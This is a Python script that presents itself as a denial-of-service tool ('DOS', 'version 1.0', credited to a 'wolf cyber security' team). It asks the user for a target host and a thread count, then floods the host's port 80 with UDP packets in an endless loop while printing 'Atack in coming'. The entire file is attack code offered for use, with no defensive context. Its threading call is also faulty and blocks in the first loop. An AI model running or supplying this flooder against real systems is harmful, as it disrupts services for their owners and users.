import socket
import sys
import _thread 
import time
from colorama import Fore,init
init()
import os
a = os.system("clear")
print(a)
############################################
print(Fore.RED+"""
██████╗  ██████╗ ███████╗
██╔══██╗██╔═══██╗██╔════╝
██║  ██║██║   ██║███████╗
██║  ██║██║   ██║╚════██║
██████╔╝╚██████╔╝███████║
╚═════╝  ╚═════╝ ╚══════╝
    version: 1.0
    coded: green cyber
    team: wolf cyber security

""")
target = input(Fore.BLUE+"Enter your target Address=> ")
treadd = input(Fore.BLUE+"Enter your thread=>")
print(Fore.RED+"[=====%25]")
time.sleep(2)
print(Fore.YELLOW+"[========%50]")
time.sleep(2)
print(Fore.YELLOW+"[=============%75]")
time.sleep(2)
print(Fore.GREEN+"[====================%100]")
time.sleep(3)
time.sleep(2)
ip4 = socket.gethostbyname(target)
UDP_PORT = 80
massage = "666"
print(Fore.LIGHTRED_EX+"your target address: ",ip4)
print("your target port: ",UDP_PORT)
time.sleep(2)
def abzar(i):
    while 1:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(bytes(massage,"UTF-8"), (ip4,UDP_PORT))
        print(Fore.GREEN+"[+]Atack in coming....")
for i in range(int(treadd   )):
    try:
        _thread.start_new_thread(abzar(i), ("thread-" + str(i),))
    except KeyboardInterrupt:
        sys.exit(0)
while 1:
    pass